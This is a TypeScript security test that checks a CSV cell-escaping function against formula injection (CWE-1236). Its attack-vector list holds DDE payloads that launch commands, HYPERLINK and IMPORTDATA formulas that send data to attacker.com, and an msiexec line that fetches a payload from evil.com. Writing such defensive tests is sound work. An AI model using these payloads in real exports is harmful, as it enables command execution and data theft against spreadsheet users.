import { escapeCsvCell } from '../../apps/web/src/lib/export';

console.log('=== CWE-1236 CSV Formula Injection Security Stress Test ===');

const attackVectors = [
  // 1. Classic Command Execution via DDE / Calc
  { payload: '=1+1', expectedStarts: "'=1+1" },
  { payload: '=cmd|\' /C calc\'!A0', expectedStarts: "'=cmd" },
  { payload: '+cmd|\' /C calc\'!A0', expectedStarts: "'+cmd" },
  { payload: '-cmd|\' /C calc\'!A0', expectedStarts: "'-cmd" },
  { payload: '@cmd|\' /C calc\'!A0', expectedStarts: "'@cmd" },
  { payload: '\t=cmd|\' /C calc\'!A0', expectedStarts: "'\t=cmd" },
  { payload: '\r=cmd|\' /C calc\'!A0', expectedStarts: "'\r=cmd" },

  // 2. Data Exfiltration via Hyperlink / Web Queries
  { payload: '=HYPERLINK("https://attacker.com/leak?data="&A1,"Export Report")', expectedStarts: "'=HYPERLINK" },
  { payload: '+HYPERLINK("https://attacker.com/pwn","Click")', expectedStarts: "'+HYPERLINK" },
  { payload: '-HYPERLINK("https://attacker.com/pwn","Click")', expectedStarts: "'-HYPERLINK" },
  { payload: '@HYPERLINK("https://attacker.com/pwn","Click")', expectedStarts: "'@HYPERLINK" },
  { payload: '=IMPORTDATA("https://attacker.com/data.csv")', expectedStarts: "'=IMPORTDATA" },

  // 3. Mathematical & Spreadsheet Expression Triggers
  { payload: '=SUM(A1:A100)', expectedStarts: "'=SUM" },
  { payload: '+SUM(A1:A100)', expectedStarts: "'+SUM" },
  { payload: '-SUM(A1:A100)', expectedStarts: "'-SUM" },
  { payload: '@SUM(A1:A100)', expectedStarts: "'@SUM" },

  // 4. Numeric Sign Injection
  { payload: '+123456789', expectedStarts: "'+123456789" },
  { payload: '-987654321', expectedStarts: "'-987654321" },

  // 5. Embedded RFC 4180 Quotes & Commas Combinations
  {
    payload: '=HYPERLINK("http://evil.com/steal?data=", "Click, Here")',
    check: (res: string) => {
      // Must start with quote escaping and be RFC 4180 quoted
      return res.startsWith('"\'=HYPERLINK') && res.endsWith('"') && res.includes('""Click, Here""');
    },
  },
  {
    payload: '=1+1,"Second Column Inject"',
    check: (res: string) => {
      // Formula prefix must be neutralized and comma must be enclosed in quotes
      return res.startsWith('"\'=1+1,') && res.endsWith('"');
    },
  },

  // 6. Single Character Edge Cases
  { payload: '=', expectedStarts: "'=" },
  { payload: '+', expectedStarts: "'+" },
  { payload: '-', expectedStarts: "'-" },
  { payload: '@', expectedStarts: "'@" },
  { payload: '\t', expectedStarts: "'\t" },
  { payload: '\r', expectedStarts: "'\r" },

  // 7. Unicode & Obfuscation Attempts
  { payload: '=EMBED("Word.Document.8","")', expectedStarts: "'=EMBED" },
  { payload: '=DDE("cmd";"/C calc";"__DUMMY__")', expectedStarts: "'=DDE" },
  { payload: '=msiexec /i http://evil.com/payload.msi', expectedStarts: "'=msiexec" },
];

let failed = 0;

for (let i = 0; i < attackVectors.length; i++) {
  const { payload, expectedStarts, check } = attackVectors[i];
  const escaped = escapeCsvCell(payload);

  // If enclosed in double quotes (due to RFC 4180 for quotes/commas/newlines/cr), unwrap for prefix checking
  const unquoted = (escaped.startsWith('"') && escaped.endsWith('"'))
    ? escaped.slice(1, -1)
    : escaped;

  let passed = false;
  if (check) {
    passed = check(escaped);
  } else if (expectedStarts) {
    passed = unquoted.startsWith(expectedStarts);
  }

  // Mandatory invariant: The raw content inside must start with `'` (single quote text-marker)
  const isNeutralized = unquoted.startsWith("'");

  if (!isNeutralized) {
    console.error(`[FAIL] Vector ${i + 1} NOT neutralized: input=${JSON.stringify(payload)} -> escaped=${JSON.stringify(escaped)}`);
    failed++;
  } else if (!passed) {
    console.error(`[FAIL] Vector ${i + 1} failed specific assertion: input=${JSON.stringify(payload)} -> escaped=${JSON.stringify(escaped)}`);
    failed++;
  } else {
    console.log(`[PASS] Vector ${i + 1}: ${JSON.stringify(payload).slice(0, 35).padEnd(35)} -> ${JSON.stringify(escaped).slice(0, 35)}`);
  }
}

// 8. Safe Inputs Integrity Stress Check (ensure legitimate strings are not mangled)
const safeInputs = [
  { input: 'SAP_ECC_60', expected: 'SAP_ECC_60' },
  { input: 'Normal Description Text', expected: 'Normal Description Text' },
  { input: 'Clean Core Tier 1', expected: 'Clean Core Tier 1' },
  { input: 2026, expected: '2026' },
  { input: null, expected: '' },
  { input: undefined, expected: '' },
  { input: 'Value with, comma', expected: '"Value with, comma"' },
  { input: 'Value with "quotes"', expected: '"Value with ""quotes"""' },
];

console.log('\n--- Safe Input Preservation Check ---');
for (const { input, expected } of safeInputs) {
  const result = escapeCsvCell(input);
  if (result !== expected) {
    console.error(`[FAIL] Safe input altered unexpectedly: input=${input}, expected=${expected}, got=${result}`);
    failed++;
  } else {
    console.log(`[PASS] Safe input preserved: ${JSON.stringify(input)} -> ${JSON.stringify(result)}`);
  }
}

if (failed > 0) {
  console.error(`\nFAILED: ${failed} tests failed!`);
  process.exit(1);
} else {
  console.log(`\n======================================================`);
  console.log(`ALL ${attackVectors.length + safeInputs.length} CWE-1236 & ESCAPING STRESS TESTS PASSED!`);
  console.log(`======================================================`);
  process.exit(0);
}
